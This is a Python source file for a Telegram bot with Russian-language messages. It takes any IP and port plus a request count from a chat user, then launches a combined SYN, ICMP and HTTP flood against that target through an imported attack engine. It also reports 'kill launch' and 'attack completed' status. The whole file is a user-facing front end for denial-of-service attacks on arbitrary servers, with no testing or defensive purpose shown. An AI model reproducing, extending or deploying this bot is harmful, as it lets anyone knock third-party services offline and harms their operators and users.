import telebot
from telebot.types import Message
import asyncio
import threading
from attack_engine import AttackEngine
from utils import parse_ip_port, is_valid_port
from config import MAX_THREADS, TIMEOUT

user_data = {}
attack_engines = {}

def register_handlers(bot):
    @bot.message_handler(commands=['start'])
    def start(message: Message):
        chat_id = message.chat.id
        user_data[chat_id] = {}
        bot.send_message(chat_id, "Привет! 👋\nРад видеть тебя в нашем боте))\nПиши ip, port сервера.")

    @bot.message_handler(func=lambda m: True)
    def handle_message(message: Message):
        chat_id = message.chat.id
        text = message.text.strip()

        if chat_id not in user_data:
            user_data[chat_id] = {}

        if 'target' not in user_data[chat_id]:
            ip, port = parse_ip_port(text)
            if ip and is_valid_port(port):
                user_data[chat_id]['target'] = f"{ip}:{port}"
                bot.send_message(chat_id, "Введите кол-во запросов😉")
            else:
                bot.send_message(chat_id, "❌ Неверный формат. Пиши как: 192.168.1.1:8080 или domain.com:443")

        elif 'count' not in user_data[chat_id]:
            try:
                count = int(text)
                if count < 1:
                    bot.send_message(chat_id, "Количество должно быть больше 0")
                    return
                user_data[chat_id]['count'] = count
                target = user_data[chat_id]['target']
                bot.send_message(chat_id, f"🚀 ЗАПУСК УБИЙСТВА на {target} с {count} запросами (SYN+ICMP+HTTP)")

                def run_attack():
                    loop = asyncio.new_event_loop()
                    asyncio.set_event_loop(loop)
                    engine = AttackEngine(max_threads=MAX_THREADS, timeout=TIMEOUT)
                    attack_engines[chat_id] = engine
                    loop.run_until_complete(engine.single_attack(target, count))
                    bot.send_message(chat_id, f"✅ Атака завершена. Отправлено {count} пакетов/запросов.")

                thread = threading.Thread(target=run_attack)
                thread.start()
                del user_data[chat_id]

            except ValueError:
                bot.send_message(chat_id, "❌ Введите целое число (количество запросов)")

    @bot.message_handler(commands=['stop'])
    def stop_attack(message: Message):
        chat_id = message.chat.id
        if chat_id in attack_engines and attack_engines[chat_id].running:
            attack_engines[chat_id].stop()
            bot.send_message(chat_id, "⛔ Атака остановлена.")
        else:
            bot.send_message(chat_id, "Активных атак нет.")
